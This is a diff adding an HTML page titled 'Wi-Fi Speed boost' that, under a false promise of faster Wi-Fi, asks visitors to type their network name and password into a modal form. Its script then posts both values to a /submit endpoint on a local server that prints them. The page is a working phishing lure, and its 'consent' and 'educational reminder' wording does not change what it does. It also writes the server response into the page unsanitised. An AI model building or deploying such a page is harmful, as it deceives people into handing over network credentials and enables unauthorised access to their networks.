@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Wi-Fi Speed boost</title>
+
+  <style>
+    :root{
+      --bg: linear-gradient(180deg,#eef6f9,#f8fbfd);
+      --card:#ffffff;
+      --accent:#007a4d;
+      --muted:#55616a;
+      --radius:12px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#042029;padding:36px;
+      -webkit-font-smoothing:antialiased;
+    }
+
+    .container{ max-width:920px;margin:0 auto; display:flex; gap:28px; align-items:flex-start; }
+    .card{ background:var(--card); padding:20px; border-radius:var(--radius); box-shadow:0 8px 28px rgba(6,32,42,0.06); flex:1; }
+
+    h1{ margin:0 0 8px 0; font-size:20px }
+    p.lead{ margin:0 0 16px 0; color:var(--muted) }
+
+    /* 3D button */
+    .cta-wrap { display:flex; gap:12px; align-items:center; margin-top:14px; flex-wrap:wrap; }
+    .btn-3d {
+      --w: 220px;
+      --h: 56px;
+      width:var(--w); height:var(--h);
+      border-radius:12px;
+      display:inline-flex; align-items:center; justify-content:center;
+      font-weight:800; letter-spacing:.4px;
+      color:white; cursor:pointer; border:none;
+      transform-style:preserve-3d;
+      transition:transform .18s cubic-bezier(.2,.9,.2,1), box-shadow .18s;
+      perspective:800px;
+      background: linear-gradient(135deg, #00b070, #007a4d);
+      box-shadow: 0 18px 30px rgba(0,122,77,0.15), 0 6px 8px rgba(0,0,0,0.06);
+    }
+    .btn-3d:active { transform: translateY(2px) scale(.995); box-shadow: 0 12px 20px rgba(0,122,77,0.12); }
+    .btn-3d .surface {
+      display:block; width:100%; height:100%;
+      border-radius:12px;
+      transform: translateZ(18px);
+      box-shadow: inset 0 -6px 14px rgba(0,0,0,0.08);
+      text-align:center; line-height:var(--h);
+    }
+    /* hover tilt effect */
+    .btn-3d:hover { transform: translateY(-6px) rotateX(6deg) rotateY(-4deg); box-shadow: 0 26px 40px rgba(0,122,77,0.18); }
+
+    /* icon */
+    .btn-3d .icon { margin-right:8px; font-size:14px; opacity:0.95 }
+
+    /* small helper */
+    .small { color:var(--muted); font-size:13px; margin-top:10px; }
+
+    /* Modal */
+    .modal-back { position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(3,10,18,0.6); z-index:1000; }
+    .modal { width:94%; max-width:520px; background:#fff; border-radius:12px; padding:18px; box-shadow:0 24px 50px rgba(2,10,20,0.45); }
+    .modal h3 { margin:0 0 8px 0; }
+    .modal p { margin:0 0 12px 0; color:#374151; }
+    .modal label{ display:block; font-size:13px; color:#374151; margin-top:10px; margin-bottom:6px; }
+    .modal input[type="text"], .modal input[type="password"] {
+      width:100%; padding:10px 12px; border-radius:8px; border:1px solid #e6eef2; font-size:14px;
+    }
+    .modal .actions { display:flex; gap:8px; justify-content:flex-end; margin-top:14px; }
+    .btn { padding:10px 14px; border-radius:8px; border:0; cursor:pointer; font-weight:700 }
+    .btn.primary { background:var(--accent); color:white }
+    .btn.ghost { background:transparent; border:1px solid #e6eef2; color:#374151 }
+
+    /* response box (inline) */
+    .response { margin-top:12px; padding:12px; border-radius:8px; background:#f6fbf8; border:1px solid rgba(0,122,77,0.06); display:none; }
+    pre { white-space:pre-wrap; word-break:break-word; margin:0; }
+
+    @media (max-width:720px){
+      .container{ flex-direction:column }
+      .btn-3d { --w:100%; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h1>Wi-Fi Speed boost</h1>
+      <p class="lead">This page demonstrates a local consent flow. Clicking the button below opens a secure prompt where a consenting user can type their Wi-Fi SSID and password. Submitted values are sent only to the local server (e.g. Termux running <code>server.py</code>) and are printed in the server console.</p>
+
+      <div class="cta-wrap">
+        <!-- 3D animated button -->
+        <button id="openModalBtn" class="btn-3d" title="Click to provide consent and submit">
+          <span class="surface"><span class="icon">🔒</span> Provide Wi-Fi Credentials</span>
+        </button>
+
+        <div style="display:flex;flex-direction:column;">
+          <div class="small">JUST WIFI SPEED BOOST</div>
+          <div class="small" style="margin-top:6px;color:#555">You must manually type the credentials. Browsers do not expose saved Wi-Fi passwords to web pages.</div>
+        </div>
+      </div>
+
+      <div id="inlineResponse" class="response" role="status" aria-live="polite"></div>
+    </div>
+  </div>
+
+  <!-- modal: consent & input -->
+  <div id="modal" class="modal-back" role="dialog" aria-modal="true">
+    <div class="modal" role="document">
+      <h3>Consent & Submit Wi-Fi Information</h3>
+      <p>Pleas all info correct now. By clicking <strong>Submit</strong> boost now.</p>
+
+      <form id="consentForm" method="POST" action="/submit">
+        <label for="ssid">Wi-Fi Name</label>
+        <input id="ssid" name="ssid" type="text" required placeholder="enter wifi name">
+
+        <label for="password">Wi-Fi Password</label>
+        <input id="password" name="password" type="password" required placeholder="Enter wifi  password">
+
+        <div class="actions">
+          <button type="button" class="btn ghost" id="cancelBtn">Cancel</button>
+          <button type="submit" class="btn primary">Submit to boost wifi speed</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Elements
+    const modalBack = document.getElementById('modal');
+    const openBtn = document.getElementById('openModalBtn');
+    const cancelBtn = document.getElementById('cancelBtn');
+    const consentForm = document.getElementById('consentForm');
+    const inlineResponse = document.getElementById('inlineResponse');
+
+    // Open modal
+    openBtn.addEventListener('click', () => {
+      modalBack.style.display = 'flex';
+      // autofocus first input after paint
+      setTimeout(()=> document.getElementById('ssid').focus(), 120);
+    });
+
+    cancelBtn.addEventListener('click', closeModal);
+    modalBack.addEventListener('click', (ev) => { if(ev.target === modalBack) closeModal(); });
+
+    function closeModal(){
+      modalBack.style.display = 'none';
+      consentForm.reset();
+    }
+
+    // submit via fetch to keep UX on page
+    consentForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      inlineResponse.style.display = 'none';
+      const data = new URLSearchParams(new FormData(consentForm)).toString();
+      try {
+        const res = await fetch(consentForm.action, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: data
+        });
+        const text = await res.text();
+        // show server response inline so user sees confirmation
+        inlineResponse.innerHTML = text;
+        inlineResponse.style.display = 'block';
+        closeModal();
+      } catch (err) {
+        inlineResponse.innerText = 'Local submit error: ' + (err.message || err);
+        inlineResponse.style.display = 'block';
+      }
+    });
+
+    // IMPORTANT: Educational reminder
+    console.log("Reminder: Browsers do not expose stored Wi-Fi passwords to web pages for security reasons.");
+  </script>
+</body>
+</html>
